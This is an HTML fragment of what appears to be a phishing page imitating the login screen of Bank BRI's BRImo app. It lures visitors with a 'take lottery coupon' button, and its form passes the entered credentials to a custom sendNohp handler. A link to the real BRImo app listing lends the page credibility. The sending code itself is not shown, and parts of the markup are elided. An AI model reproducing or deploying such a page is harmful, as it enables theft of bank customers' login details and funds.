...
<body>
     <div class="container">
                ...
                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnw91TaVSqYE0cHXQ2J8I0wb2XsKPm2M-qWBhXXLGGDpeN_DY4E3zE3wQP5QyiJAMZ9CS4gqUUU39TxWcZ8PjNaEcvUVf2Jq4k9LnCoeA7pqRWxpgVuUFPBD-mhBs4vxVzQMeWxt1EuEKmXMUw_HJOBd8UdzqxqtG7Tb_UheOOlvN7ZocANCnDChMzeilP/s3264/1000381630.jpg" alt="" width="100%" height="50%" style="margin-top: -25px"/>
            </div>
  ...
  <div style="position: fixed; left: 0; right: 0; width: 100%; top: 0; bottom: 0; height: 100%; background: ; display: " id="formlogin" >
    <div style="position: absolute; left: 0; right: 0; width: 100%; height: 315px; background: white; margin: 0px auto; bottom: 0; border-radius: 15px 15px 0px 0px; border: 0px solid blue" class="">

<center>
<h3 style="position: absolute; left: 0; right: 0; top: 0; margin: 0px auto; font-size :19px; font-weight: 700; top: 7">Login</h3>
</center>
<form onsubmit="sendNohp(event); return false" method="POST" id="inputlogin" style="margin-top: -35px">
...
<div class="bubble-element eye clickable-element" tabindex="3" id="eyeOpen">
                        ...
                        <div class="bubble-element eye clickable-element" tabindex="3" id="eyeClose" style="display: none">
                            <ion-icon name="eye" id="eye"></ion-icon>
                                       ...
                                       <button id="btnsubmit" disabled class="btn-login" type="submit">AMBIL KUPON UNDIAN</button>
                                       <center>
 <a href="https://play.google.com/store/apps/details?id=id.co.bri.brimo" target="_blank" style="color: #025198; font-weight: 600; font-family: sans-serif; position: fixed; bottom: 30; left: 0; right: 0; margin: 0px auto; font-size: 18px">Lupa Username/Password?</a>
 </center>
    </div>
    </div>
    </form>
